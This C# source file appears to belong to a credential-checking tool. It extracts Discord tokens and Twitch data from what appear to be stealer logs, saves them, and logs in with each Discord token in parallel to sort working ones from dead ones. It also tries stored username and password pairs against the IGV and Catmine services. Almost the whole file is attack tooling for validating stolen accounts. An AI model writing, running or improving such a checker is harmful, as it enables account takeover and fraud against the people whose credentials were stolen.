using Console.Extensions;
using Console.Models;
using Console.Models.Abstractions;
using Console.Models.Attributes;
using Console.Models.Views;
using Core.Checkers;
using Core.Checkers.Crypto;
using Core.Parsers.Services;

namespace Console.Views;

public class ServicesView(IRoot root,
        DataService data,
        Settings settings,
        DiscordChecker discord,
        IGVChecker igv,
        CatmineChecker catmine)
    : ArgsView(root)
{
    [Command]
    public Task Twitch() => data.SaveAsync(settings.Path[(settings.Path.LastIndexOf('\\') + 1)..], settings.Path.TwitchFromLogs());

    [Command]
    public async Task Discord()
    {
        StreamWriter? invalid = await data.CreateWriterAsync("invalid"), valid = await data.CreateWriterAsync("valid");
        var tokens = settings.Path.DiscordByLogs().Distinct().ToArray();
        
        await data.SaveAsync("tokens", tokens);

        if (invalid is null || valid is null)
        {
            _ExitWait();
            return;
        }
        
        System.Console.WriteLine("Check? (Y/n)");
        
        if (System.Console.ReadKey(false).Key != ConsoleKey.Y) return;
        
        async Task WriteInvalid(string token)
        {
            System.Console.Out.WriteInvalidLine(token);
            await invalid.WriteLineAsync(token);
        }
        
        async Task WriteValid(string token)
        {
            System.Console.Out.WriteValidLine(token);
            await valid.WriteLineAsync(token);
        }

        await Parallel.ForEachAsync(tokens,
            async (token, cancel) =>
            {
                if (cancel.IsCancellationRequested) return;

                bool? check;
                
                do
                {
                    check = await discord.TryLoginAsync(token);
                } while (check is null);

                if (check is false) await WriteInvalid(token);
                else await WriteValid(token);
            });

        invalid.Close();
        valid.Close();
        
        _ExitWait();
    }

    [Command]
    public async Task IGV()
    {
        await foreach (var account in data.ReadAccountsAsync("igv", name: "Accounts"))
        {
            if (await igv.TryLoginAsync(account.Username, account.Password) is {})
                System.Console.Out.WriteValidLine(account.ToStringShort());
            else
                System.Console.Out.WriteInvalidLine(account.ToStringShort());
        }
        
        _ExitWait();
    }

    [Command]
    public async Task Catmine()
    {
        await foreach (var account in data.ReadAccountsAsync("catmine", name: "Accounts"))
        {
            if (await catmine.TryLoginAsync(account.Username, account.Password))
                System.Console.Out.WriteValidLine(account.ToStringShort());
            else
                System.Console.Out.WriteInvalidLine(account.ToStringShort());
        }
        
        _ExitWait();
    }
}